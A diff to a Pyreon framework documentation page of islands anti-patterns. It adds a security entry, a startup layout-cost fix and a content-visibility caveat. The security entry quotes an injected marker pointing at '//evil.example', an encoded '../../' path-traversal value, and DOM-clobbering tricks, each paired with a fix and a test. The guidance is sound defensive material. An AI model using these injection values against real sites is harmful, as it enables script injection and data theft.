@@ -5,6 +5,12 @@ description: "Common islands mistakes in Pyreon and how to fix them."
 
 > **Generated** from `.agents/rules/anti-patterns.md` (the same source as MCP `get_anti_patterns`). Each entry is a real mistake + its fix; where a detector code is listed, the linter / `pyreon doctor` / MCP `validate` catches it automatically.
 
+### A DOM attribute must never choose the origin or path of something inserted as HTML or imported as code.
+
+Markup that reaches a page (anything a sanitizer lets through with custom elements and `data-*`) can plant a marker, so an attribute the runtime reads back is attacker input. A server-island marker read its fragment base from `data-base`: `<pyreon-server-island data-name="x" data-base="//evil.example">` fetched `//evil.example/_pyreon/fragment/x` (that server only needs `Access-Control-Allow-Origin: *`) and inserted the response with `innerHTML` (#4768 review). Rules: the base/origin comes from code (the component's router read in its body, an explicit argument, `setServerIslandBase` with zero's build constant), never from the DOM; a value that becomes a URL path is validated (`isRoutePath` in `@pyreon/server/paths`); and **escaping into one path segment is not a containment boundary — an intermediary may decode it**: nginx's standard sub-path proxy forwards the normalised URI (`%2F` decoded, `..` resolved), so `encodeURIComponent('../../api/x')` reaches the app as `/api/x`. A name that becomes a path segment must stay one segment after decoding (`isIslandName`: no `/`, `\`, `%`, control characters or all-dots name), and every side that sees it — registration, the browser, the endpoint — applies that ONE function; the final URL is resolved against `location.origin` and refused unless same-origin; page-supplied values may only become encoded query values the same-origin endpoint verifies. The same class for code: `data-component` picks a loader with `Object.hasOwn(registry, id)`, never `registry[id]` (an inherited `constructor`/`toString` would be called as a loader). And DOM clobbering: markup with `id="X"` makes the global `X` resolve to the element (named access on Window), so trusted client configuration lives in module scope, and a `globalThis` slot shared across bundles is used only after a type check (`instanceof Map`, `typeof === 'string'`); `server-island-clobber.browser.test.ts`. Reference: `server/src/server-island.ts:activateServerIslandElement` (threat model), `server/src/client.ts` (`hydrateIslands`); locked by `server-island-client.test.tsx` ("a crafted marker cannot steer the fragment request") and `client.test.ts` (inherited `data-component`).
+
+---
+
 ### Importing `island` from the `@pyreon/server` main barrel into client/route code
 
 Import from `@pyreon/server/client` in any file that ships to the client (every `@pyreon/zero` route does).
@@ -46,6 +52,12 @@ Context is owner-based, and a late `hydrateRoot` has no parent owner, so `useCon
 ### [FIXED, 2026-11] Observing an element that has no box (#4435).
 
 The `visible` trigger observed the island element, then (one fix later) its element children when the island was `display: contents`. An IntersectionObserver never reports a box-less target, so an island whose content started under a further `contents` wrapper (a nested `<PyreonUI mode>` renders one) never hydrated and its chunk was never requested. **Rule: observe the first elements under the island that are not `display: contents`, at ANY depth (`client.ts:visibilityTargets`, shared with `prefetch: 'visible'`); an element hidden right now (`display: none`, closed `<details>`) is still a target and fires when shown; with no element at all (a `contents` island holding only text or nothing) observe the nearest boxed ancestor and warn once per page in dev (`[Pyreon] island "X" uses hydrate: 'visible' but nothing in it can be observed`, catalogued in `diagnose`).** Any API that needs geometry of a node the author does not control (IntersectionObserver, ResizeObserver, `getBoundingClientRect`) must say what it does when that node has no box. `interaction` is unaffected (events follow the DOM, capture phase); `idle`/`media` are layout-free. No static audit: whether a wrapper is box-less is CSS, often from a dependency. Locks: `server/src/tests/island-visible-targets.browser.test.tsx` (the class table in real Chromium) and `island-visible-targets.test.ts` — bisect-verified.
+
+---
+
+### [FIXED, 2026-11] Reading layout or computed style while islands are set up.
+
+`visibilityTargets` called `getComputedStyle` for every `visible` island inside the islands module's evaluation, which usually runs before the first paint, so it forced a synchronous style recalc and a layout of the whole document there (10 ms of a 17 ms task on pyreon.dev's home page, unthrottled; Lighthouse multiplies that into Total Blocking Time). Observe the island element first and resolve its targets in the IntersectionObserver's first report, which arrives after the browser's own layout (`observeNearViewport` in `server/src/client.ts`). Any startup code that measures (`getComputedStyle`, `getBoundingClientRect`, `offset*`) has the same cost. Test: `server/src/tests/island-visible-targets.test.ts` ("reads no computed style until the observer reports").
 
 ---
 
@@ -112,5 +124,11 @@ An `island()` in a file nothing imports never renders. Route it or delete it. Au
 ### Cross-file registry drift
 
 A manual `hydrateIslands({ X })` key with no matching `island()` `name` (keys are case-sensitive). Use `hydrateIslandsAuto()` with `pyreon({ islands: true })` to avoid manual sync. `pyreon doctor --only islands-audit` reports `registry-mismatch`.
+
+---
+
+### `content-visibility: auto` on page sections of varying height.
+
+It skips style, layout and paint of a section until it nears the viewport, using `contain-intrinsic-size` as a placeholder height. On pyreon.dev (sections 446–2,463 px against a 900 px placeholder) it broke two things real visitors rely on: a scroll to an element in a later section (`scrollIntoView`, an in-page link) landed where the placeholders put it, then the sections in between rendered at their real height and pushed the target out of view, so a `hydrate: 'visible'` island there never hydrated; and `innerText` of a skipped section is empty (copy, reading tools). Tried for Lighthouse TBT in #4766 and removed: use it only for a long list of items of known, uniform height.
 
 ---
